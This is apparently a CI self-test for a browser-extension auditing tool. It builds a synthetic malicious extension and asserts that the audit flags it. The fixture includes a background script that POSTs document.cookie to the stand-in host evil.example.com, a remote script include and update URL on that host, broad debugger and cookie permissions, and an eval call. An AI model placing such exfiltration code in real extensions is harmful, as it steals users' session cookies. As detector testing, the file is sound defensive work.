// ext-audit.test.mjs — fixture self-test, runs in CI BEFORE any claim.
// Builds a synthetic malicious extension, asserts the audit fires.
// Fails the run while nothing is staked (no claim yet = no fuse, no cost).
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { auditExtension, summarizeNet } from "./ext-audit.js";

const d = mkdtempSync(path.join(tmpdir(), "fxext-"));
mkdirSync(path.join(d, "js"), { recursive: true });
writeFileSync(path.join(d, "manifest.json"), JSON.stringify({
  manifest_version: 3,
  name: "Fixture Evil",
  version: "0.0.1",
  permissions: ["debugger", "cookies", "storage"],
  host_permissions: ["<all_urls>"],
  content_scripts: [{ matches: ["<all_urls>"], js: ["js/cs.js"], run_at: "document_start", all_frames: true, world: "MAIN" }],
  update_url: "https://evil.example.com/updates.xml",
}));
writeFileSync(path.join(d, "popup.html"), `<script src="https://evil.example.com/r.js"></script>`);
writeFileSync(path.join(d, "js", "bg.js"), `const k = "AKIAIOSFODNN7EXAMPLE";\nfetch("https://evil.example.com/in",{method:"POST",body:document.cookie});\neval("1");\n`);
writeFileSync(path.join(d, "js", "cs.js"), `// empty`);

const a = auditExtension(d, JSON.parse(readFileSync(path.join(d, "manifest.json"), "utf8")));
const ids = new Set(a.findings.map((f) => f.id));
// assert every planted finding fires (fixture has no externally_connectable block — not asserted)
for (const id of ["perm:debugger", "host:all-urls", "cs:broad-match", "cs:main-world", "ext:update-url", "ext:remote-script"]) {
  if (![...ids].some((x) => x === id || x.startsWith(id.split(":")[0] + ":"))) throw new Error("fixture miss: " + id + " (got " + [...ids].join(",") + ")");
}
if (!a.secrets.some((s) => s.label === "aws-key")) throw new Error("fixture miss: aws-key secret");
if (!a.secrets.some((s) => s.label === "eval-use")) throw new Error("fixture miss: eval-use");
if (a.score < 30) throw new Error("fixture score too low: " + a.score);
const net = summarizeNet([
  { method: "POST", host: "evil.example.com", url: "https://evil.example.com/in", post: 512 },
  { method: "GET", host: "evil.example.com", url: "https://evil.example.com/r.js", post: 0 },
]);
if (net.distinctHosts !== 1 || net.topPosts[0]?.host !== "evil.example.com") throw new Error("fixture miss: net summary");
rmSync(d, { recursive: true, force: true });
console.log("fixture self-test PASS score=" + a.score + " findings=" + a.findings.length + " secrets=" + a.secrets.length);
